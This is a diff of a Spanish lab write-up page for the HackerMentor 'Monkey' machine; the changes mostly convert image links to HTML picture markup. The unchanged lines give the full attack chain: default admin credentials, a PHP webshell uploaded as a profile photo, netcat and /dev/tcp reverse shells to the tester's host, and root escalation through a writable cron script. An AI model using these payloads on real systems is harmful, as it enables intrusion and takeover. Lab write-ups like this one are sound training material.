@@ -371,52 +371,136 @@ El taller tenía como requisito contar con una máquina con Kali Linux. Por suer
 <p>Para esto usamos <code>nmap</code>, una herramienta que permite escanear redes. Hice un escaneo simple para ver qué IP tenía la máquina virtual:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 192.168.185.0/24
 </span></span></code></pre></div><p>Con esto encontramos varias máquinas, pero la que nos interesa tiene la IP <code>192.168.185.128</code></p>
-<p>![[1.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/1_hu_9308bd657244dbab.webp 320w, /post/monkey-hm-writeup/images/1_hu_b9ef7eda9b94ce86.webp 640w, /post/monkey-hm-writeup/images/1_hu_e10fd54f023909b2.webp 960w, /post/monkey-hm-writeup/images/1_hu_c5b1b87d61c4f1f.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/1_hu_d195b65fac24e58e.jpg 320w, /post/monkey-hm-writeup/images/1_hu_7aab78ee0a7f973c.jpg 640w, /post/monkey-hm-writeup/images/1_hu_91142ab378d88c67.jpg 960w, /post/monkey-hm-writeup/images/1_hu_6a0fa9ac709ae3a6.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/1_hu_7aab78ee0a7f973c.jpg" width="1421" height="970" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>Ya que tenemos la IP, probamos el servicio HTTP. Vamos a ver qué hay navegando a la IP, y luego hacemos <em>fuzzing</em> de directorios (enviar muchas rutas para ver cuáles existen). Para esto usamos <code>gobuster</code> con el diccionario <a href="https://gitlab.com/kalilinux/packages/seclists/-/blob/kali/master/Discovery/Web-Content/directory-list-2.3-medium.txt" target="_blank" rel="noopener">directory-list-2.3-medium.txt</a>
 :</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -w directory-list-2.3-medium.txt -u http://192.168.185.128/
-</span></span></code></pre></div><p>![[2.png]]</p>
+</span></span></code></pre></div><p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/2_hu_8c16c863f74e1beb.webp 320w, /post/monkey-hm-writeup/images/2_hu_26fd334c9fa45ada.webp 640w, /post/monkey-hm-writeup/images/2_hu_48856d2a039e22ae.webp 960w, /post/monkey-hm-writeup/images/2_hu_f4284af08d9104bc.webp 1280w, /post/monkey-hm-writeup/images/2_hu_4292a99c72a1ef07.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/2_hu_49aeba86b12b2242.jpg 320w, /post/monkey-hm-writeup/images/2_hu_79ca38cd265da8c8.jpg 640w, /post/monkey-hm-writeup/images/2_hu_5f766ffe70906f72.jpg 960w, /post/monkey-hm-writeup/images/2_hu_8883228a8918ad71.jpg 1280w, /post/monkey-hm-writeup/images/2_hu_302e473a31374fff.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/2_hu_79ca38cd265da8c8.jpg" width="1788" height="703" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>¡Y listo! Tenemos rutas interesantes. La que más llamó mi atención fue <code>/monkey</code>, que coincide con el nombre del archivo de la máquina virtual. Así que repetimos la enumeración, pero apuntando a esa ruta:</p>
 <blockquote>
 <p>!  <code>gobuster dir -w directory-list-2.3-medium.txt -u http://192.168.185.128/monkey</code></p></blockquote>
 <h2 id="primer-acceso---credenciales-débiles">Primer acceso - credenciales débiles</h2>
 <p>Este escaneo nos mostró nuevas rutas. La más llamativa es <code>/monkey/admin</code>, que parece un panel de administración. Probamos credenciales fáciles, como <code>admin:admin</code>… ¡y funcionó! 💁‍♂️</p>
-<p>![[3.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/3_hu_f24889a15383f26c.webp 320w, /post/monkey-hm-writeup/images/3_hu_5ab983dac99ba677.webp 640w, /post/monkey-hm-writeup/images/3_hu_2fef574104f92f54.webp 960w, /post/monkey-hm-writeup/images/3_hu_54b8a6c797b4adff.webp 1280w, /post/monkey-hm-writeup/images/3_hu_af38acfa9cc31c55.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/3_hu_e38f63a1f8ce6ec0.jpg 320w, /post/monkey-hm-writeup/images/3_hu_1ccea2d1210a03d9.jpg 640w, /post/monkey-hm-writeup/images/3_hu_cbca32c598563347.jpg 960w, /post/monkey-hm-writeup/images/3_hu_afc625ed21439bc0.jpg 1280w, /post/monkey-hm-writeup/images/3_hu_17106b6d228b4d58.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/3_hu_1ccea2d1210a03d9.jpg" width="1760" height="958" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <h2 id="segundo-acceso---credenciales-por-defecto">Segundo acceso - Credenciales por defecto</h2>
 <p>Ya dentro como administradores, encontramos una sección para gestionar estudiantes. Nos permite restablecer su contraseña y nos muestra cuál es la nueva; siempre la misma, por cierto.</p>
-<p>![[4.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/4_hu_dfc11f3cc38b4d51.webp 320w, /post/monkey-hm-writeup/images/4_hu_4e3e0f3ab426d439.webp 640w, /post/monkey-hm-writeup/images/4_hu_a5989204ffe5b799.webp 960w, /post/monkey-hm-writeup/images/4_hu_ce42819d6b4f3e1a.webp 1280w, /post/monkey-hm-writeup/images/4_hu_b5fd1e745d2eb409.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/4_hu_6fd5cba41b8e1da7.jpg 320w, /post/monkey-hm-writeup/images/4_hu_7695910ab40b8013.jpg 640w, /post/monkey-hm-writeup/images/4_hu_f3a2898da4f4530c.jpg 960w, /post/monkey-hm-writeup/images/4_hu_53c08551d3b2c539.jpg 1280w, /post/monkey-hm-writeup/images/4_hu_c585c63d9ec73577.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/4_hu_7695910ab40b8013.jpg" width="1602" height="824" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>En este punto me doy cuenta de que este reto es de <strong>HackerMentor</strong>, así que por respeto no compartiré públicamente el enlace directo de la máquina virtual, ya que puede ser parte de su material privado.</p>
 <p>Usamos estas nuevas credenciales en la ruta <code>/monkey</code> y logramos ingresar como estudiante. Este panel nos deja actualizar la foto de perfil.</p>
-<p>![[5.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/5_hu_49cac2e02f2fc148.webp 320w, /post/monkey-hm-writeup/images/5_hu_2eedfeef34c22671.webp 640w, /post/monkey-hm-writeup/images/5_hu_199d654fe315e329.webp 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/5_hu_74f6f5b70b9630ce.jpg 320w, /post/monkey-hm-writeup/images/5_hu_37a9aceea28941f.jpg 640w, /post/monkey-hm-writeup/images/5_hu_58dc11be069916ee.jpg 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/5_hu_37a9aceea28941f.jpg" width="1163" height="966" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <h2 id="ejecución-de-comandos---webshell">Ejecución de comandos - Webshell</h2>
 <p>Aquí intentamos subir un archivo que, aunque parezca una imagen, en realidad es código PHP. ¿Por qué PHP? Porque es el lenguaje que usa la aplicación, y queremos ejecutar comandos en el servidor. Esto se llama una <em>webshell</em>.</p>
 <p>Subí un archivo muy simple con este contenido:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&#34;cmd&#34;</span><span class="o">])</span><span class="p">;</span>?&gt;
 </span></span></code></pre></div><p>¿Y qué hace? Cualquier cosa que le pases por la URL como parámetro <code>cmd</code>, será ejecutada en el servidor. Este fue el resultado:</p>
-<p>![[monkey-hm-writeup/images/6.png]]</p>
+<p><div class="not-prose">
+<figure>
+    <img src="images/monkey-hm-writeup/images/6.png"
+      alt="" 
+      loading="lazy"
+    >
+  </figure></div>
+</p>
 <h2 id="ejecución-de-comandos---reverse-shell">Ejecución de comandos - reverse shell</h2>
 <p>Ya podemos ejecutar comandos, pero queremos algo más cómodo: una terminal interactiva. Para eso, usamos una <strong>shell reversa</strong>, es decir, el servidor se conecta a nosotros. Enviamos el siguiente comando de netcat(<code>nc</code>) desde el navegador:</p>
 <pre tabindex="0"><code>http://192.168.185.128/monkey/studentphoto/shell.php?cmd=nc%20192.168.185.1%205555%20-e%20%2Fbin%2Fsh
 </code></pre><p>Mientras que en nuestra terminal usamos ncat pero para dejar un puerto a la escucha de la conexión que nos llegara del servidor al puerto 5555. Esto se vería así:</p>
-<p>![[7.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/7_hu_5150016743234076.webp 320w, /post/monkey-hm-writeup/images/7_hu_ac61507f6a447c38.webp 640w, /post/monkey-hm-writeup/images/7_hu_2e64c242cdd17271.webp 960w, /post/monkey-hm-writeup/images/7_hu_d6938515a2df9c88.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/7_hu_6228d8117bde0b56.jpg 320w, /post/monkey-hm-writeup/images/7_hu_9fca143c0a2e21bc.jpg 640w, /post/monkey-hm-writeup/images/7_hu_2eba0631c8bc37db.jpg 960w, /post/monkey-hm-writeup/images/7_hu_1c682cb45118c7b7.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/7_hu_9fca143c0a2e21bc.jpg" width="1374" height="561" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>¡Listo! Ya tenemos una terminal remota. Navegamos por los archivos y encontramos uno interesante: <code>config.php</code>, ubicado en <code>/var/www/html/monkey/includes</code>.</p>
-<p>![[8.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/8_hu_554d8a36f75a4eda.webp 320w, /post/monkey-hm-writeup/images/8_hu_37cf64f1d5e23e35.webp 640w, /post/monkey-hm-writeup/images/8_hu_afd20095f61d21fc.webp 960w, /post/monkey-hm-writeup/images/8_hu_b7dff710794bc8dc.webp 1280w, /post/monkey-hm-writeup/images/8_hu_efa9c255208bbcb.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/8_hu_d3e22e6a6ddf5c5b.jpg 320w, /post/monkey-hm-writeup/images/8_hu_cec0953b678c341d.jpg 640w, /post/monkey-hm-writeup/images/8_hu_db9de6db92187553.jpg 960w, /post/monkey-hm-writeup/images/8_hu_108c88615fd1712f.jpg 1280w, /post/monkey-hm-writeup/images/8_hu_6813c99c179b8591.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/8_hu_cec0953b678c341d.jpg" width="1829" height="699" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>Con este hallazgo obtenemos unas credenciales que usaremos en el servicio ssh que vimos al inicio con nmap(por eso es importante el reconocimiento y enumeración).</p>
 <h2 id="ejecución-de-comandos---ssh">Ejecución de comandos - SSH</h2>
 <p>Con estas credenciales, nos conectamos por SSH y conseguimos una <strong>shell estable</strong>. Y con eso, ¡la primera bandera! 🏁 (un código disponible en un texto que nos puede llegar a demostrar que logramos acceso a un usuario con ciertos privilegios).</p>
-<p>![[9.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/9_hu_9e90951db73d1b82.webp 320w, /post/monkey-hm-writeup/images/9_hu_9d30bf31a179cdf4.webp 640w, /post/monkey-hm-writeup/images/9_hu_5dc3f0956bc3ef47.webp 960w, /post/monkey-hm-writeup/images/9_hu_d8cf1ee3e17178eb.webp 1280w, /post/monkey-hm-writeup/images/9_hu_5259b24ede1b44d9.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/9_hu_dc02d248e682ce8c.jpg 320w, /post/monkey-hm-writeup/images/9_hu_6f0e97354d5f593d.jpg 640w, /post/monkey-hm-writeup/images/9_hu_47ba03080fc4c323.jpg 960w, /post/monkey-hm-writeup/images/9_hu_415a7385357a6ab0.jpg 1280w, /post/monkey-hm-writeup/images/9_hu_30e1666579a03388.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/9_hu_6f0e97354d5f593d.jpg" width="1840" height="683" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>Pero aún no terminamos… ¡necesitamos acceso total! Necesitamos ser <strong>root</strong>.</p>
 <p>Copiamos la herramienta <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener">linPEAS</a>
  al servidor, la ejecutamos, y revisamos las posibles vulnerabilidades para escalar privilegios.</p>
 <p>Una de las más claras es un archivo llamado <code>backup.sh</code>, que se ejecuta como tarea programada por el usuario root.</p>
-<p>![[10.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/10_hu_366f45a553eb32a5.webp 320w, /post/monkey-hm-writeup/images/10_hu_afb856ef5bbed9f2.webp 640w, /post/monkey-hm-writeup/images/10_hu_c61c5f9b3906576e.webp 960w, /post/monkey-hm-writeup/images/10_hu_790d7b45fa6ccd2d.webp 1280w, /post/monkey-hm-writeup/images/10_hu_c769162a3368b022.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/10_hu_4bea85bfb8e99771.jpg 320w, /post/monkey-hm-writeup/images/10_hu_876473ddac77de01.jpg 640w, /post/monkey-hm-writeup/images/10_hu_de0081fe6b8d72f6.jpg 960w, /post/monkey-hm-writeup/images/10_hu_4afb95e7892a5ba4.jpg 1280w, /post/monkey-hm-writeup/images/10_hu_18ee94b8dea919a9.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/10_hu_876473ddac77de01.jpg" width="1797" height="644" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <h2 id="escalación-de-privilegios---mala-gestión-de-permisos">Escalación de privilegios - Mala gestión de permisos</h2>
 <p>Este archivo <code>backup.sh</code> puede ser editado por nuestro usuario (punto 1). Y vemos que modifica archivos con permisos de root, además de que se actualiza constantemente (punto 2).</p>
-<p>![[11.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/11_hu_cc1db1560d3e85ba.webp 320w, /post/monkey-hm-writeup/images/11_hu_36c91bca53ad55ab.webp 640w, /post/monkey-hm-writeup/images/11_hu_78cf0484cc438b14.webp 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/11_hu_22e364318a7a250b.jpg 320w, /post/monkey-hm-writeup/images/11_hu_4be33fda72d5fbe1.jpg 640w, /post/monkey-hm-writeup/images/11_hu_8e3c37fc816ecf08.jpg 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/11_hu_4be33fda72d5fbe1.jpg" width="1278" height="186" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <p>Entonces editamos el archivo para añadir un comando que se ejecutara con permisos de root. El comando elegido para que ademas nos brinde permisos de elevados es algo que ya vimos antes, una shell reversa. Añadimos la linea:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/sh -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.185.1/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></span></code></pre></div><p>Luego, en nuestra máquina dejamos el puerto 4444 a la escucha y… ¡tenemos shell con permisos de root! 🎉 Ya podemos acceder a la segunda bandera.</p>
-<p>![[12.png]]</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/12_hu_d5ef532b625bb8e6.webp 320w, /post/monkey-hm-writeup/images/12_hu_1de6c2d2eb2d9342.webp 640w, /post/monkey-hm-writeup/images/12_hu_675b3d00270d8799.webp 960w, /post/monkey-hm-writeup/images/12_hu_861c1b262a4f221a.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/12_hu_31f5fa491822f14.jpg 320w, /post/monkey-hm-writeup/images/12_hu_e347356eed24f0c1.jpg 640w, /post/monkey-hm-writeup/images/12_hu_ce47e5976f8fea7.jpg 960w, /post/monkey-hm-writeup/images/12_hu_716b84f62c1417bb.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/12_hu_e347356eed24f0c1.jpg" width="1324" height="953" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
 <h2 id="conclusiones">Conclusiones</h2>
 <p>¿Qué aprendimos de todo esto?</p>
 <ul>
